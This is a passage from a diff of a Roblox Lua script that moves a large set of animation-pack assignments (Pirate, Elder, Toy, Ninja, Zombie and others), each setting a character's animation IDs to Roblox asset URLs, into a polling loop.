-                    if animwalk.Value == "Pirate" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
-                    end
-
-                    if animfall.Value == "Pirate" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
-                    end
-
-                    if animjump.Value == "Pirate" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
-                    end
-
-                    if animidle.Value == "Pirate" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
-                    end
-
-                    if animclimb.Value == "Pirate" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
-                    end
-
-                    --- Elder
-                    if animrun.Value == "Elder" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921104374" 	
-                    end
-
-                    if animwalk.Value == "Elder" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921111375"
-                    end
-
-                    if animfall.Value == "Elder" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921105765"
-                    end
-
-                    if animjump.Value == "Elder" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921107367"
-                    end
-
-                    if animidle.Value == "Elder" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921101664"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921102574"
-                    end
-
-                    if animclimb.Value == "Elder" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921100400"
-                    end
-
-                    --- Toy (my favorite)
-                    if animrun.Value == "Toy" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921306285" 	
-                    end
-
-                    if animwalk.Value == "Toy" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921312010"
-                    end
-
-                    if animfall.Value == "Toy" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921307241"
-                    end
-
-                    if animjump.Value == "Toy" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921308158"
-                    end
-
-                    if animidle.Value == "Toy" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921301576"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921302207"
-                    end
-
-                    if animclimb.Value == "Toy" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921300839"
-                    end
-
-                    --- Bubbly
-                    if animrun.Value == "Bubbly" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921057244" 	
-                    end
-
-                    if animwalk.Value == "Bubbly" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10980888364"
-                    end
-
-                    if animfall.Value == "Bubbly" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921061530"
-                    end
-
-                    if animjump.Value == "Bubbly" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921062673"
-                    end
-
-                    if animidle.Value == "Bubbly" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921054344"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921055107"
-                    end
-
-                    if animclimb.Value == "Bubbly" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921053544"
-                    end
-
-                    --- Astronaut
-                    if animrun.Value == "Astronaut" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921039308" 	
-                    end
-
-                    if animwalk.Value == "Astronaut" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921046031"
-                    end
-
-                    if animfall.Value == "Astronaut" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921040576"
-                    end
-
-                    if animjump.Value == "Astronaut" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921042494"
-                    end
-
-                    if animidle.Value == "Astronaut" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921034824"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921036806"
-                    end
-
-                    if animclimb.Value == "Astronaut" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921032124"
-                    end
-
-                    --- Vampire
-                    if animrun.Value == "Vampire" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921320299" 	
-                    end
-
-                    if animwalk.Value == "Vampire" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921326949"
-                    end
-
-                    if animfall.Value == "Vampire" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921321317"
-                    end
-
-                    if animjump.Value == "Vampire" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921322186"
-                    end
-
-                    if animidle.Value == "Vampire" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921315373"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921316709"
-                    end
-
-                    if animclimb.Value == "Vampire" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921314188"
-                    end
-
-                    --- Werewolf
-                    if animrun.Value == "Werewolf" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921336997" 	
-                    end
-
-                    if animwalk.Value == "Werewolf" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921342074"
-                    end
-
-                    if animfall.Value == "Werewolf" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921337907"
-                    end
-
-                    if animjump.Value == "Werewolf" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
-                    end
-
-                    if animidle.Value == "Werewolf" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921330408"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921333667"
-                    end
-
-                    if animclimb.Value == "Werewolf" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921329322"
-                    end
-
-                    --- Rthro
-                    if animrun.Value == "Rthro" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921261968" 	
-                    end
-
-                    if animwalk.Value == "Rthro" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921269718"
-                    end
-
-                    if animfall.Value == "Rthro" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921262864"
-                    end
-
-                    if animjump.Value == "Rthro" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921263860"
-                    end
-
-                    if animidle.Value == "Rthro" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921258489"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921259953"
-                    end
-
-                    if animclimb.Value == "Rthro" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921257536"
-                    end
-
-                    --- Oldschool
-                    if animrun.Value == "Oldschool" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921240218" 	
-                    end
-
-                    if animwalk.Value == "Oldschool" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921244891"
-                    end
-
-                    if animfall.Value == "Oldschool" and animtype.Value == "Custom" then
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921241244"
-                    end
-
-                    if animjump.Value == "Oldschool" and animtype.Value == "Custom" then
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921242013"
-                    end
-
-                    if animidle.Value == "Oldschool" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921230744"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921232093"
-                    end
-
-                    if animclimb.Value == "Oldschool" and animtype.Value == "Custom" then
-                        Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921229866"
-                    end
-
-                    --- Mr.Toilet
-                    if animrun.Value == "Toilet" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=4417979645" 	
-                    end
-
-                    if animidle.Value == "Toilet" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=4417977954"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=4417978624"
-                    end
-
-                    --- Ud'Zal
-                    if animrun.Value == "Rthro Heavy Run" and animtype.Value == "Custom" then
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=3236836670" 	
-                    end
-
-                    if animidle.Value == "Ud'zal" and animtype.Value == "Custom" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=3303162274"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=3303162549"
-                    end
-
-                    if animwalk.Value == "Ud'zal" and animtype.Value == "Custom" then
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=3303162967"
-                    end
-
-                    if animtype.Value == "Tryhard" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921301576"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921302207"
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921162768"
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921157929"
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
-                    end
-
-                    if animtype.Value == "Goofy" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=4417977954"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=4417978624"
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921162768"
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=4417979645"
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
-                    end
-
-                    if animtype.Value == "Tanqr" then
-                        Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921034824"
-                        Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921036806"
-                        Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921312010"
-                        Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921306285"
-                        Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921242013"
-                        Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
-                    end
+                    repeat
+                        task.wait()
+                        local Hum = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
+                        if not Hum then
+                            repeat task.wait() until Hum
+                        end
+                        local Animate = game:GetService("Players").LocalPlayer.Character.Animate
+                        -- Cartoony
+                        if animrun.Value == "Cartoony" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921076136"
+                        end
+                        if animwalk.Value == "Cartoony" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921082452"
+                        end
+                        if animfall.Value == "Cartoony" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921077030"
+                        end
+                        if animjump.Value == "Cartoony" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921078135"
+                        end
+                        if animidle.Value == "Cartoony" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921071918"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921072875"
+                        end
+                        if animclimb.Value == "Cartoony" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921070953"
+                        end
+                        -- Levitation
+                        if animrun.Value == "Levitation" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921135644"
+                        end
+                        if animwalk.Value == "Levitation" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921140719"
+                        end
+                        if animfall.Value == "Levitation" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
+                        end
+                        if animjump.Value == "Levitation" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
+                        end
+                        if animidle.Value == "Levitation" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921132962"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921133721"
+                        end
+                        if animclimb.Value == "Levitation" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921132092"
+                        end
+                        -- Robot
+                        if animrun.Value == "Robot" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921250460"
+                        end
+                        if animwalk.Value == "Robot" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921255446"
+                        end
+                        if animfall.Value == "Robot" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921251156"
+                        end
+                        if animjump.Value == "Robot" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921251519"
+                        end
+                        if animidle.Value == "Robot" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921247776"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921248461"
+                        end
+                        if animclimb.Value == "Robot" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921245669"
+                        end
+                        -- Stylish
+                        if animrun.Value == "Stylish" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921529786"
+                        end
+                        if animwalk.Value == "Stylish" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921539727"
+                        end
+                        if animfall.Value == "Stylish" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921531448"
+                        end
+                        if animjump.Value == "Stylish" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921533736"
+                        end
+                        if animidle.Value == "Stylish" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921527750"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921528141"
+                        end
+                        if animclimb.Value == "Stylish" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921525854"
+                        end
+                        -- Superhero
+                        if animrun.Value == "Superhero" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921350016"
+                        end
+                        if animwalk.Value == "Superhero" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921353493"
+                        end
+                        if animfall.Value == "Superhero" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921350451"
+                        end
+                        if animjump.Value == "Superhero" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921351314"
+                        end
+                        if animidle.Value == "Superhero" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921348319"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921349011"
+                        end
+                        if animclimb.Value == "Superhero" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921346417"
+                        end
+                        -- Zombie
+                        if animrun.Value == "Zombie" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921472697"
+                        end
+                        if animwalk.Value == "Zombie" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921474987"
+                        end
+                        if animfall.Value == "Zombie" and animtype.Value == "Custom" then
+                            warn("Zombies don't work well with spider fall animation")
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921473341"
+                        end
+                        if animjump.Value == "Zombie" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921474136"
+                        end
+                        if animidle.Value == "Zombie" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921470171"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921470752"
+                        end
+                        if animclimb.Value == "Zombie" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921469135"
+                        end
+                        -- Ninja
+                        if animrun.Value == "Ninja" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10920910496"
+                        end
+                        if animwalk.Value == "Ninja" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10920915507"
+                        end
+                        if animfall.Value == "Ninja" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10920912824"
+                        end
+                        if animjump.Value == "Ninja" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10920913905"
+                        end
+                        if animidle.Value == "Ninja" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10920909751"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10920910154"
+                        end
+                        if animclimb.Value == "Ninja" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10920908048"
+                        end                   
+                        if animrun.Value == "Knight" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921121197" 	
+                        end
+                        if animwalk.Value == "Knight" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921127095"
+                        end
+                        if animfall.Value == "Knight" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921122579"
+                        end
+                        if animjump.Value == "Knight" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921123517"
+                        end
+                        if animidle.Value == "Knight" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921117521"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921118894"
+                        end
+                        if animclimb.Value == "Knight" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921116196"
+                        end
+
+                        if animrun.Value == "Mage" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921148209" 	
+                        end
+
+                        if animwalk.Value == "Mage" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921152678"
+                        end
+
+                        if animfall.Value == "Mage" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921148939"
+                        end
+
+                        if animjump.Value == "Mage" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921149743"
+                        end
+
+                        if animidle.Value == "Mage" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921144709"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921145797"
+                        end
+
+                        if animclimb.Value == "Mage" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921143404"
+                        end
+
+                        --- Pirate
+                        if animrun.Value == "Pirate" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738" 	
+                        end
+
+                        if animwalk.Value == "Pirate" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
+                        end
+
+                        if animfall.Value == "Pirate" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
+                        end
+
+                        if animjump.Value == "Pirate" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
+                        end
+
+                        if animidle.Value == "Pirate" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
+                        end
+
+                        if animclimb.Value == "Pirate" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
+                        end
+
+                        --- Elder
+                        if animrun.Value == "Elder" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921104374" 	
+                        end
+
+                        if animwalk.Value == "Elder" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921111375"
+                        end
+
+                        if animfall.Value == "Elder" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921105765"
+                        end
+
+                        if animjump.Value == "Elder" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921107367"
+                        end
+
+                        if animidle.Value == "Elder" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921101664"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921102574"
+                        end
+
+                        if animclimb.Value == "Elder" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921100400"
+                        end
+
+                        --- Toy (my favorite)
+                        if animrun.Value == "Toy" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921306285" 	
+                        end
+
+                        if animwalk.Value == "Toy" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921312010"
+                        end
+
+                        if animfall.Value == "Toy" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921307241"
+                        end
+
+                        if animjump.Value == "Toy" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921308158"
+                        end
+
+                        if animidle.Value == "Toy" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921301576"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921302207"
+                        end
+
+                        if animclimb.Value == "Toy" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921300839"
+                        end
+
+                        --- Bubbly
+                        if animrun.Value == "Bubbly" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921057244" 	
+                        end
+
+                        if animwalk.Value == "Bubbly" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10980888364"
+                        end
+
+                        if animfall.Value == "Bubbly" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921061530"
+                        end
+
+                        if animjump.Value == "Bubbly" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921062673"
+                        end
+
+                        if animidle.Value == "Bubbly" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921054344"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921055107"
+                        end
+
+                        if animclimb.Value == "Bubbly" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921053544"
+                        end
+
+                        --- Astronaut
+                        if animrun.Value == "Astronaut" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921039308" 	
+                        end
+
+                        if animwalk.Value == "Astronaut" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921046031"
+                        end
+
+                        if animfall.Value == "Astronaut" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921040576"
+                        end
+
+                        if animjump.Value == "Astronaut" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921042494"
+                        end
+
+                        if animidle.Value == "Astronaut" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921034824"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921036806"
+                        end
+
+                        if animclimb.Value == "Astronaut" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921032124"
+                        end
+
+                        --- Vampire
+                        if animrun.Value == "Vampire" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921320299" 	
+                        end
+
+                        if animwalk.Value == "Vampire" and animtype.Value == "Custom" then
+                            Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921326949"
+                        end
+
+                        if animfall.Value == "Vampire" and animtype.Value == "Custom" then
+                            Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921321317"
+                        end
+
+                        if animjump.Value == "Vampire" and animtype.Value == "Custom" then
+                            Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921322186"
+                        end
+
+                        if animidle.Value == "Vampire" and animtype.Value == "Custom" then
+                            Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921315373"
+                            Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921316709"
+                        end
+
+                        if animclimb.Value == "Vampire" and animtype.Value == "Custom" then
+                            Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921314188"
+                        end
+
+                        --- Werewolf
+                        if animrun.Value == "Werewolf" and animtype.Value == "Custom" then
+                            Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921336997" 	
+                        end
+
